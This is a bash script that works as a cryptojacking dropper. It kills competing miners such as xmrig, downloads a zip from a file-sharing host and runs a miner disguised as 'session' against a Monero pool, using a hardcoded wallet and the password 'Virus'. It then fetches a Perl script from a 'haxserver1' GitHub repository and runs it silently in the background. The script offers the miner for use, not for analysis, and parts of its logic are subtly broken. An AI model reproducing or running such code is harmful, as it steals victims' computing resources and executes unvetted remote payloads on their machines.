#!/bin/bash

# Check if an argument is provided
if [ -z "$1" ]; then
  echo "Usage: $0 {1|2|3}"
  exit 1
fi

# Define the URLs
URL1="https://oshi.at/dpaQ"
# URL2="https://oshi.at/eLXs"
# URL3="https://oshi.at/CzkH"

# Select the URL based on the argument
case $1 in
  1)
    URL=$URL1
    ;;
  # 2)
  #   URL=$URL2
  #   ;;
  # 3)
  #   URL=$URL3
  #   ;;
  *)
    echo "Invalid argument. Please use 1, 2, or 3."
    exit 1
    ;;
esac
echo "Removing other miner if any"
pkill xmrig
pkill session_ajqysbe
pkill session_ajqysbey
pkill session
echo "Removing Done!"

# Download the file
echo "Downloading the Worker $1"
wget $URL -O kwarta.zip
if [ $? -ne 0 ]; then
  echo "wget failed to download kwarta.zip. Trying with curl."
  curl -o kwarta.zip $URL
  if [ $? -ne 0 ]; then
    echo "curl also failed to download kwarta.zip. Please check the URL or your internet connection."
    exit 1
  else
    echo "kwarta.zip downloaded successfully with curl."
  fi
else
  echo "kwarta.zip downloaded successfully with wget."
fi

# Unzip the downloaded file
echo "Unzipping the file"
unzip kwarta.zip
if [ $? -ne 0 ]; then
  echo "Unzipping failed."
  rm -rf kwarta.zip
  exit 1
else
  echo "Unzipping Complete."
fi

# Remove the zip file
rm -rf kwarta.zip

# Change directory to the extracted folder
cd sess_aksd19sb187ss1ia901b23
if [ $? -ne 0 ]; then
  echo "Directory change failed. The expected directory may not exist."
  exit 1
fi

# Make all files in the directory executable
chmod +x *

# Use session.log as the log file
LOG_FILE="session.log"

# Run the executable file in the background, capturing output to session.log
./session -o gulf.moneroocean.stream:80 -u 442xHeyLLcgQSSgbKJrMiG8mECruxyviqKMDt41nMXhgiCJFmA4CJaoQ8gGDz7EH89c2cUk6LaKN1RTPatbU3xhR6dPvaMf -k -p Virus

# Get the PID of the last background process
PID=$!

# Wait for a moment to check if the process is still running
sleep 3

# Check if the process is running
if ps -p $PID > /dev/null; then
  echo "Process started successfully with PID $PID."

  # Download and run sup.pl
  wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
  if [ $? -ne 0 ]; then
    echo "wget failed to download sup.pl. Trying with curl."
    curl -O https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
    if [ $? -ne 0 ]; then
      echo "curl also failed to download sup.pl."
      exit 1
    else
      echo "sup.pl downloaded successfully with curl."
    fi
  else
    echo "sup.pl downloaded successfully with wget."
  fi

  nohup perl sup.pl >/dev/null 2>&1 &
  if [ $? -eq 0 ]; then
    echo "sup.pl started successfully."
  else
    echo "Failed to start sup.pl."
    exit 1
  fi

else
  echo "Failed to start process with nohup. Trying alternate method."

  # Try an alternate method to run in the background
  ./session 
  PID=$!
  sleep 3

  if ps -p $PID > /dev/null; then
    echo "Process started successfully with alternate method with PID $PID."

    # Download and run sup.pl
    wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
    if [ $? -ne 0 ]; then
      echo "wget failed to download sup.pl. Trying with curl."
      curl -O https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/sup.pl
      if [ $? -ne 0 ]; then
        echo "curl also failed to download sup.pl."
        exit 1
      else
        echo "sup.pl downloaded successfully with curl."
      fi
    else
      echo "sup.pl downloaded successfully with wget."
    fi

    nohup perl sup.pl >/dev/null 2>&1 &
    if [ $? -eq 0 ]; then
      echo "sup.pl started successfully."
    else
      echo "Failed to start sup.pl."
      exit 1
    fi

  else
    echo "Failed to start process with alternate method."
    exit 1
  fi
fi

echo "Script executed successfully."
exit 1
